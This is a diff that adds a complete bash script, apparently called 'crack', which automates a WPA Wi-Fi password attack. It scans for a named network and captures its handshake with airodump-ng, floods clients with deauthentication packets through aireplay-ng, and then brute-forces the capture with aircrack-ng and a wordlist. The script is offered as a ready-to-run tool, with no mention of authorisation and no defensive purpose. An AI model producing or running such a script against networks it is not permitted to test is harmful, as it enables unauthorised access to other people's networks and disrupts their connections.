@@ -1,0 +1,53 @@
+if [ "$#" -ne 3 ]; then
+    echo "Usage ./crack wireless_interface wireless_network dictionary"
+    exit 1;
+fi
+
+WIFI_INTERFACE=$1
+WIFI_NETWORK=$2
+DICTIONARY=$3
+
+echo DISABLING WIFI...
+ifconfig $WIFI_INTERFACE down
+iwconfig $WIFI_INTERFACE mode monitor
+
+echo SCANNING WIFI ADAPTERS...
+airodump-ng $WIFI_INTERFACE -w /tmp/wirelessDump.txt &> /dev/null & sleep 7; kill $!
+cat /tmp/wirelessDump.txt-01.csv | grep $WIFI_NETWORK > /tmp/wireless.txt
+ADAPTER_MAC="$(awk -F", " '{print $1}' /tmp/wireless.txt)"
+CHANNEL="$(awk -F", " '{print $4}' /tmp/wireless.txt)"
+
+echo FOUND ADAPTER $ADAPTER_MAC
+echo FOUND CHANNEL $CHANNEL
+
+echo START RECORDING REAUTHENTICATION PACKETS...
+timeout 150 airodump-ng --bssid $ADAPTER_MAC -c $CHANNEL --write /tmp/WPAcrack $WIFI_INTERFACE &> /dev/null & #sleep 40; kill $!
+
+echo SENDING DEAUTHENTICATION PACKETS...
+aireplay-ng --deauth 150 -a $ADAPTER_MAC $WIFI_INTERFACE >/dev/null & sleep 90; kill $!
+
+killall -9 airodump-ng
+killall -9 aireplay-ng
+
+sleep 10
+echo REACTIVATING WIFI...
+ifconfig $WIFI_INTERFACE down
+iwconfig $WIFI_INTERFACE mode managed
+ifconfig $WIFI_INTERFACE up
+dhclient $WIFI_INTERFACE
+
+ping -c 2 www.google.co.il > /dev/null; 
+
+if [ "$?" = 0 ]
+then
+  echo CONNECTION ESTABLISHED!
+else
+  echo CONNECTION RE-ESTABLISHMENT FAILED!
+fi
+
+echo CRACKING...
+aircrack-ng /tmp/WPAcrack-01.cap -w $DICTIONARY -a 2 -b $ADAPTER_MAC
+
+rm /tmp/WPA*
+rm /tmp/wireless*
+killall aircrack-ng
